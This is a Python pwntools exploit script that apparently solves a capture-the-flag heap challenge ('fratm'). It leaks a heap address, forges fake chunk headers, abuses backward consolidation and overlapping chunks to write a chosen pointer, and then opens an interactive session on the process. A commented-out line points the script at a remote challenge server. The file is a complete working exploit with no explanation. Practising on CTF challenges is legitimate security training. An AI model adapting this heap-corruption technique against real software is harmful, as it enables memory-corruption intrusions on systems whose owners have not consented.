#! /usr/bin/python3
from pwn import *

context.binary = elf = ELF('./fratm_patched')

p = elf.process()
#gdb.attach(p)

#p = remote("92.246.89.201", 10007)

def allocateSmall(index, name, surname, serial):
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b">> ", f"{index}".encode())
    p.sendafter(b"NAME> ", name)
    p.sendafter(b"SURNAME> ", surname)
    p.sendlineafter(b"SERIAL> ", f"{serial}".encode())
    p.recvuntil(b'FREE COOKIE ')
    leak = p.recvlineS()
    return index, leak

def allocateBig(index, title, report ):
    p.sendlineafter(b">> ", b"3")
    p.sendlineafter(b">> ", f"{index}".encode())
    p.sendafter(b"TITLE> ", title)
    p.sendafter(b"CONTENT> ", report)
    return index

def deleteSmall(index):
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b">> ", f"{index}".encode())


def deleteBig(index):
    p.sendlineafter(b">> ", b"4")
    p.sendlineafter(b">> ", f"{index}".encode())



# Get operator position
p.sendlineafter(b'>> ', b'5')
p.recvuntil(b'Id: ')
op = p.recvlineS()
op = int(op)
print("op ", hex(op))


# Setup heap to backward consolidation
fd = bk = 0x10
a,leak = allocateSmall(0,p32(0x51)+p32(0x0)+p64(fd)+b'\n', p64(bk)+p64(0x0)+b'\n', 10)
print(leak)
deleteSmall(a)

fd = bk = int(leak,16)
a,leak = allocateSmall(0,p32(0x51)+p32(0x0)+p64(fd)+b'\n', p64(bk)+p64(0x0)+b'\n', 10)
print(leak)
b,_ = allocateSmall(1,b'EEEEFFFFEEEEFFFF\n', b'GGGGHHHHGGGGHHHH\n', 10)
c,_ = allocateSmall(2,b'JJJJKKKKJJJJKKKK\n', b'LLLLMMMMLLLLMMMM\n', 10)

allocateSmall(10,p32(0x51)+p32(0x0)+b'\n', p64(0x0)+b'\n', 10)
allocateSmall(11,b'AAAAAAAAAAAAAAAA\n', b'AAAAAAAAAAAAAAAA\n', 10)
allocateSmall(12,b'AAAAAAAAAAAAAAAA\n', b'AAAAAAAAAAAAAAAA\n', 10)

allocateSmall(13,b'AAAAAAAAAAAAAAAA\n', b'AAAAAAAAAAAAAAAA\n', 10)

deleteSmall(b)

b,_ = allocateSmall(1,p64(0)+p64(0)+b'\n', p64(0)+p64(0x50)+b'\xc0\n', 10)
deleteSmall(c)
############


deleteSmall(b)

where = op
r1 = allocateBig(0, b"BBBBBBBB\n", p64(0)+p64(0x31)+p64(where)+b"\n")

allocateSmall(1,'Fulvio\n', 'admin\n', 10)
allocateSmall(1,'Fulvio\n', 'admin\n', 10)

p.sendlineafter(b'>>', b'5')
p.sendlineafter(b'>>', b'fratm')

p.interactive()